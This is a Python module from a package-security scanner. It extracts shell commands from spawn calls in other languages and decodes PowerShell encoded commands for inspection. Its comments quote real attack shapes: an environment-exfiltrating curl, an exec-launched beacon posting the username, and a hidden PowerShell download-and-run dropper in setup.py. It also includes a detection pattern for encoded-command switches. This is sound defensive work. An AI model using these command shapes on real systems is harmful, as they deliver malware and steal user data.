"""Commands written as strings inside another language.

A shell command embedded in source is data to every language pack that could
see it. The Python rules look at a `.py` file and find a string; the shell
rules, which know what `curl -d "$(env)" https://...` means, never run on a
`.py` file at all. The command therefore passes through a scan that examined
both languages, because it fell between them.

This module closes that seam by locating the places where a string is
unambiguously a command -- the argument of a process-spawning call -- and
handing that text back so the shell rules can be applied to it directly.

Extraction is deliberately narrow. It reads the argument of a spawn call and
nothing else, so a usage example in a docstring, a URL in a comment or a
command in a README is not treated as an invocation. Being wrong in that
direction produces a false positive on a file that is already doing something
worth reading, which is the more expensive mistake here.

Python is handled by the AST tier instead, which resolves aliases and folds
spliced literals; this covers the languages there is no standard-library
parser for, where a bounded pattern over the call site is what is available.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

MAX_COMMANDS = 32
"""Enough to characterise a file. A file with more spawn sites than this is
already established as interesting, and the rest add cost without changing any
conclusion."""

MAX_COMMAND_CHARS = 4096
"""Commands longer than this are truncated rather than dropped. The signal in a
command is at its head -- the program and its first arguments."""

_ARGUMENT_WINDOW = 2048
"""How far past a call's opening parenthesis to look for its arguments. Bounded
so that an unclosed parenthesis in a malformed file cannot make the scan walk
the whole of it."""

_SPAWN_CALL = re.compile(
    r"""\b(?:
        exec | execSync | execFile | execFileSync | execa | execaSync
      | spawn | spawnSync | fork
      | shell_exec | passthru | proc_open | popen | system
    )\s*\(""",
    re.VERBOSE,
)
"""Calls whose arguments are a command line.

`exec` covers Node's `child_process`; `shell_exec`, `passthru` and `proc_open`
are PHP; `system` and `popen` appear in several languages including Ruby and
Perl. The name alone is the trigger, without requiring the module it came
from, because the import may be aliased and the cost of the extra match is one
bounded pattern over a slice.
"""

_QUOTES = "'\"`"
"""Delimiters that open a string literal in the languages handled here."""

MAX_LITERAL_CHARS = 1000
"""Longest literal read from a call's arguments."""

LANGUAGES = frozenset(
    {
        "javascript",
        "typescript",
        "php",
        "ruby",
        "perl",
        "lua",
        "groovy",
        "java",
        "kotlin",
        "scala",
        "csharp",
        "go",
        "rust",
        "c",
        "cpp",
    }
)
"""Languages where a call named `exec` invokes a process.

The restriction is what keeps this honest. A rule pack, a lockfile or a
document may all contain the text `exec("...")` without any of it being an
invocation, and treating those as command sites turns every file that
*describes* a command into a file that *runs* one. Cordon's own rule packs are
the first thing that mistake flags.

Python is absent deliberately: it is handled by the AST tier, which resolves
aliases and folds spliced literals rather than guessing from a name.
"""


@dataclass(frozen=True, slots=True)
class Command:
    """A command line found inside another language's source."""

    text: str
    line: int


def extract(text: str, language: str | None = None) -> list[Command]:
    """Command strings passed to spawn calls in this source.

    Every string literal in a call's argument list is joined, because the
    command is as often split across a sequence -- `spawn("sh", ["-c", "..."])`
    -- as it is written whole.

    Returns nothing for a language that does not invoke processes this way, so
    a rule pack or a document containing the same text is not read as a call.
    """
    if language not in LANGUAGES:
        return []

    commands: list[Command] = []

    for call in _SPAWN_CALL.finditer(text):
        if len(commands) >= MAX_COMMANDS:
            break

        window = text[call.end() : call.end() + _ARGUMENT_WINDOW]
        arguments = window[: _close_paren(window)]
        parts = _literals(arguments)
        if not parts:
            # The command may be a name rather than a literal. One line of
            # indirection defeated all of this:
            #
            #     const command = `curl -X POST "https://.../$(whoami)/" ...`;
            #     exec(command, (error, stdout, stderr) => { ... });
            #
            # That is `elf-stats-candystriped-muffin-773` and eight siblings
            # published the same week, each a 391-byte beacon that posts the
            # user and host name to a request-bin. Cordon reported NOTHING on
            # them: the JavaScript rules see `exec` handed a variable, and the
            # shell rules never run because the file is JavaScript, so the
            # command was read by nobody.
            parts = _assigned_literal(text, arguments, call.start())
        if not parts:
            continue

        commands.append(
            Command(
                text=" ".join(parts)[:MAX_COMMAND_CHARS],
                line=text.count("\n", 0, call.start()) + 1,
            )
        )

    return commands


_NAME = re.compile(r"^[ \t]*([A-Za-z_$][\w$]{0,64})[ \t]*[,)]")
"""A bare identifier as the first argument: `exec(command, ...)`."""


def _assignment(name: str) -> re.Pattern[str]:
    """`const NAME =`, `let NAME =`, `var NAME =`, or a bare `NAME =`."""
    return re.compile(rf"(?:const|let|var)?[ \t]*\b{re.escape(name)}[ \t]*=[ \t]*")


def _assigned_literal(text: str, arguments: str, call_start: int) -> list[str]:
    """The literal assigned to the name a spawn call was handed, if there is one.

    Only backwards, and only within this file: the value has to be established
    before the call to be the value the call receives, and a name assigned
    afterwards is a different binding or a later one. Only the LAST assignment
    before the call is read, for the same reason.

    Nothing clever about scope or reassignment is attempted. This resolves the
    one shape that actually hides commands -- a string built once and passed by
    name -- and returns nothing when it cannot be sure.
    """
    named = _NAME.match(arguments)
    if named is None:
        return []
    before = text[:call_start]
    last = None
    for assignment in _assignment(named.group(1)).finditer(before):
        last = assignment
    if last is None:
        return []
    return _literals(before[last.end() : last.end() + _ARGUMENT_WINDOW])


def _literals(window: str) -> list[str]:
    """String literals in a call's arguments.

    Scanned character by character rather than matched with a pattern. A
    literal that honours escapes needs an alternation inside a repetition to
    express as a regex, and Cordon refuses that shape in rule packs because of
    how it backtracks; the engine does not get an exemption from a rule the
    packs are held to. Scanning is also the clearer way to say it, and is
    linear by construction.
    """
    parts: list[str] = []
    index = 0
    length = len(window)

    while index < length:
        quote = window[index]
        if quote not in _QUOTES:
            index += 1
            continue

        index += 1
        start = index
        while index < length and window[index] != quote:
            # An escape consumes the character after it, so an escaped quote
            # does not end the literal.
            index += 2 if window[index] == "\\" else 1

        parts.append(window[start : min(index, start + MAX_LITERAL_CHARS)])

        if index >= length:
            # The window ended mid-literal. What was read is still kept: a
            # command long enough to run past the window is exactly the kind
            # worth matching, and discarding it would report clean on content
            # that was truncated rather than examined.
            break

        index += 1

    return parts


def _close_paren(window: str) -> int:
    """Where the call's argument list ends, or the end of the window.

    Counted rather than matched with a pattern, since balancing parentheses is
    not something a regular expression does and a nested call in the arguments
    is ordinary.
    """
    depth = 1
    for index, character in enumerate(window):
        if character == "(":
            depth += 1
        elif character == ")":
            depth -= 1
            if depth == 0:
                return index
    return len(window)


__all__ = ["LANGUAGES", "MAX_COMMANDS", "MAX_COMMAND_CHARS", "Command", "extract"]


ENCODED_COMMAND = re.compile(
    r"""(?ix)
    \b(?:powershell|pwsh)(?:\.exe)?\b        # the interpreter, named
    [^\n]{0,120}?                            # and its other switches
    # PowerShell accepts any unambiguous prefix of -EncodedCommand, so `-e`,
    # `-ec`, `-enc` and `-encodedcommand` are the same switch. `-e` alone is two
    # characters and would match a great deal, which is why the blob below is
    # required: a switch followed by sixteen or more base64 characters is not an
    # accident.
    [-/](?:e|ec|enc|enco|encod|encode|encoded|encodedc|encodedcommand)
    [\s:=]{1,4}
    ["']?([A-Za-z0-9+/=]{16,8192})["']?
    """,
)
"""`powershell -EncodedCommand <base64>`, and every abbreviation of the switch.

This is the shape that made the measurement worth running. Of 201 real malicious
PyPI packages sampled from the ASE 2023 dataset, 109 of the 171 that produced no
blocking finding were this one technique -- the EsqueleSquad campaign and its
relatives -- written in a `setup.py` as

    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand <base64>')

where the base64 decodes to `Invoke-WebRequest -Uri "https://.../x.exe" -OutFile
"~/WindowsCache.exe"; Invoke-Expression "~/WindowsCache.exe"`.

Cordon labelled the call `spawn`, and the shell pack's own `-enc` pattern
labelled it `execute`, and there it stopped. It never got `decode`, because the
decoding is done by `powershell.exe` rather than by any call in the file, and it
never got `egress`, because the URL is inside the blob. So the dropper composite
had no egress and the decode-and-execute composite had no decode, and an
install-time download-and-run was invisible."""

MAX_ENCODED_BLOB = 8192
"""Longer than this is not decoded. A bounded slice keeps a hostile file from
turning one pattern match into megabytes of work."""


def decode_encoded_commands(commands: list[Command]) -> list[Command]:
    """The commands, plus the plaintext of any encoded command among them.

    Appended rather than substituted. The encoded form is evidence in itself --
    the shell pack matches `-enc` as an execute, and a switch whose purpose is to
    keep a command out of a log is worth reporting whether or not it decodes --
    so both are handed on and the rules see each.

    PowerShell encodes UTF-16LE, which is what the switch is specified to take.
    UTF-8 is tried second because the shape gets copied into other contexts by
    people who did not read the specification, and a payload that decodes either
    way should be read either way.
    """
    out = list(commands)
    for command in commands:
        if len(out) >= MAX_COMMANDS * 2:
            break
        for match in ENCODED_COMMAND.finditer(command.text):
            plain = _decode_blob(match.group(1))
            if plain:
                out.append(Command(text=plain[:MAX_COMMAND_CHARS], line=command.line))
    return out


SCRIPT_LANGUAGES = frozenset({"shell", "powershell"})
"""Languages where the file itself is the command line.

Deliberately not `LANGUAGES`, which is the opposite question: those are
languages that *call* a process, where a command exists as a string handed to
something. Here there is no call site, because the file is what runs."""


def encoded_commands_in(text: str) -> list[Command]:
    """The plaintext of every encoded command written in this source.

    `decode_encoded_commands` reads what a spawn call was HANDED, which is the
    right seam for `os.system("powershell -enc <blob>")` in a `setup.py`. A
    `.ps1` that runs the same thing at its top level hands it to nobody: the
    file is the script, `extract` finds no call site, and the plaintext was
    read by nothing.

    What that cost: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand
    <blob>` in a `.ps1` produced no finding at all. The switch was an `execute`
    label with no partner -- the fetch, the URL and the `IEX` were all inside
    the blob -- so the most-copied dropper one-liner in the literature scanned
    clean.
    """
    out: list[Command] = []
    for match in ENCODED_COMMAND.finditer(text):
        if len(out) >= MAX_COMMANDS:
            break
        plain = _decode_blob(match.group(1))
        if plain:
            out.append(
                Command(
                    text=plain[:MAX_COMMAND_CHARS],
                    line=text.count("\n", 0, match.start()) + 1,
                )
            )
    return out


def _decode_blob(blob: str) -> str:
    """The blob's plaintext, or an empty string if it does not read as text.

    Base64 that decodes to bytes nobody would call a command is not treated as a
    command. What is being asked is whether the author hid a program here, and a
    run of control characters answers no.
    """
    import base64
    import binascii

    if len(blob) > MAX_ENCODED_BLOB:
        return ""
    try:
        raw = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
    except (binascii.Error, ValueError):
        return ""
    for encoding in ("utf-16-le", "utf-8"):
        try:
            text = raw.decode(encoding)
        except (UnicodeDecodeError, LookupError):
            continue
        printable = sum(1 for character in text if character.isprintable() or character in "\t\n\r")
        if text and printable / len(text) > 0.9:
            return text
    return ""
